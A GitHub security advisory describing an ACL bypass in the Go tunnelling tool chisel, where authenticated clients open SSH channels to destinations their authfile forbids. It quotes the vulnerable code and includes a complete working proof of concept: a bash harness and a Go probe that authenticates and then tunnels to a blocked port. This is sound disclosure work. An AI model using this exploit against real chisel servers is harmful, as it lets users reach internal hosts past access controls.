# [H] Chisel has an ACL Bypass via Post-Handshake SSH Channel ExtraData Injection

## Summary
Severity: High
Advisory: GHSA-24fp-5v3p-rvpw
CVE: CVE-2026-48113
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:H/SA:L (CVSS_V4)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-24fp-5v3p-rvpw
Type: github-advisory

## Affected
- Go: `github.com/jpillora/chisel` — affected >=0 <1.11.5

## Details
### Summary

Authenticated chisel clients can bypass `--authfile` ACL restrictions and tunnel traffic to arbitrary destinations reachable from the server. The ACL is enforced only during the initial handshake against declared remotes, but never on subsequent SSH channels that carry actual traffic. A malicious client authenticates with a permitted remote, then opens channels to any `host:port` it wants.


### Details
The chisel server validates user ACLs in two places but is missing validation in one of the important places.

The `server/server_handler.go` checks the ACL, during the initial config handshake:

```go
for _, r := range c.Remotes {
    if user != nil {
        addr := r.UserAddr()
        if !user.HasAccess(addr) {
            failed(s.Errorf("access to '%s' denied", addr))
            return
        }
    }
}
r.Reply(true, nil)
```

This validates the declared remote list from the client's config request. It runs once, at connection setup. But in `share/tunnel/tunnel_out_ssh.go` ACL aren't being checked, when the server processes actual traffic channels:

```go
func (t *Tunnel) handleSSHChannel(ch ssh.NewChannel) {
    remote := string(ch.ExtraData())        // client-controlled
    hostPort, proto := settings.L4Proto(remote)
    sshChan, reqs, err := ch.Accept()       // accepted unconditionally
    // ...
    err = t.handleTCP(l, stream, hostPort)  // dials whatever client said
}

func (t *Tunnel) handleTCP(l *cio.Logger, src io.ReadWriteCloser, hostPort string) error {
    dst, err := net.Dial("tcp", hostPort)   // no ACL check
    // ...
}
```

The `tunnel.Config` struct has no User field, no allowed-address list, and no ACL callback. The user context from `server_handler.go` is never propagated to the tunnel layer:

```go
type Config struct {
    *cio.Logger
    Inbound   bool
    Outbound  bool
    Socks     bool
    KeepAlive time.Duration
    // ------- No User, no AllowedRemotes, no ACL
}
```
Since `ch.ExtraData()` is fully controlled by the SSH client, any authenticated user can open channels to arbitrary destinations after passing the handshake with a permitted remote.


### PoC

Directory structure format:
```
poc
├── poc.sh
└── probe
    ├── go.mod
    ├── go.sum
    └── main.go
```

- `poc.sh`

```bash
#!/usr/bin/env bash

# Requires: Go, nc (netcat)

set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
REPO="$DIR/.."

freeport() { python3 -c "import socket;s=socket.socket();s.bind(('',0));print(s.getsockname()[1]);s.close()"; }
cleanup() { kill $SERVER $LISTENER 2>/dev/null; rm -f "$AUTH"; }
trap cleanup EXIT

# Build
echo "[*] Building..."
(cd "$REPO"       && go build -o /tmp/_chisel .)
(cd "$DIR/probe"  && go build -o /tmp/_probe  .)

# Ports
SP=$(freeport); AP=$(freeport); BP=$(freeport)
echo "[*] Server :$SP  Allowed :$AP  Blocked :$BP"

# Authfile — user:pass may only reach 127.0.0.1:$AP
AUTH=$(mktemp)
printf '{"user:pass":["^127\\\\.0\\\\.0\\\\.1:%s$"]}\n' "$AP" > "$AUTH"

# Start forbidden-target listener and chisel server
(echo "FORBIDDEN_TARGET_REACHED" | nc -l 127.0.0.1 "$BP") & LISTENER=$!
/tmp/_chisel server --port "$SP" --authfile "$AUTH" --key seed 2>/dev/null & SERVER=$!
sleep 1

# Exploit
CHISEL_SERVER="127.0.0.1:$SP" ALLOWED_PORT="$AP" BLOCKED_PORT="$BP" /tmp/_probe
```

- `main.go`

```go
// Chisel ACL bypass probe. Authenticates with an allowed remote,
// then opens an SSH channel to a forbidden destination via ExtraData.
package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/gorilla/websocket"
	"github.com/jpillora/chisel/share/cnet"
	"github.com/jpillora/chisel/share/settings"
	"golang.org/x/crypto/ssh"
)

func main() {
	server := os.Getenv("CHISEL_SERVER")
	allowed := os.Getenv("ALLOWED_PORT")
	blocked := os.Getenv("BLOCKED_PORT")

	// WebSocket → net.Conn
	ws, _, err := (&websocket.Dialer{
		HandshakeTimeout: 5 * time.Second,
		Subprotocols:     []string{"chisel-v3"},
	}).Dial("ws://"+server, http.Header{})
	check(err, "ws dial")
	conn := cnet.NewWebSocketConn(ws)

	// SSH handshake
	sc, chans, reqs, err := ssh.NewClientConn(conn, "", &ssh.ClientConfig{
		User:            "user",
		Auth:            []ssh.AuthMethod{ssh.Password("pass")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	})
	check(err, "ssh")
	go ssh.DiscardRequests(reqs)
	go func() { for c := range chans { c.Reject(ssh.Prohibited, "") } }()

	// Send config with only the allowed remote
	r, _ := settings.DecodeRemote(fmt.Sprintf("0.0.0.0:%s:127.0.0.1:%s", allowed, allowed))
	cfg, _ := json.Marshal(settings.Config{Version: "0", Remotes: []*settings.Remote{r}})
	ok, reply, err := sc.SendRequest("config", true, cfg)
	check(err, "config")
	if !ok {
		die("config rejected: %s", reply)
	}
	fmt.Printf("[+] Config accepted (only 127.0.0.1:%s allowed)\n", allowed)

	// Open channel to BLOCKED destination
	target := net.JoinHostPort("127.0.0.1", blocked)
	ch, cr, err := sc.OpenChannel("chisel", []byte(target))
	if err != nil {
		fmt.Printf("[-] REJECTED — server refused %s\n", target)
		os.Exit(1)
	}
	go ssh.DiscardRequests(cr)
	fmt.Printf("[!] ACCEPTED — channel opened to %s\n", target)

	// Read response from forbidden target
	buf := make([]byte, 256)
	done := make(chan int, 1)
	go func() { n, _ := ch.Read(buf); done <- n }()
	select {
	case n := <-done:
		if n > 0 {
			fmt.Printf("[!] Data: %s\n", buf[:n])
		}
	case <-time.After(3 * time.Second):
	}
	fmt.Println("CONFIRMED — ACL bypass: server dialed unauthorized destination")
	ch.Close()
	sc.Close()
}

func check(err error, ctx string) {
	if err != nil {
		die("%s: %v", ctx, err)
	}
}
func die(f string, a ...interface{}) {
	fmt.Fprintf(os.Stderr, f+"\n", a...)
	os.Exit(1)
}
```

### Impact

- Complete ACL bypass: The `--authfile` address restrictions are enforceable only on paper
-  Authenticated users can reach any host/port the server process can dial

## References
- https://github.com/jpillora/chisel/security/advisories/GHSA-24fp-5v3p-rvpw
- https://github.com/jpillora/chisel
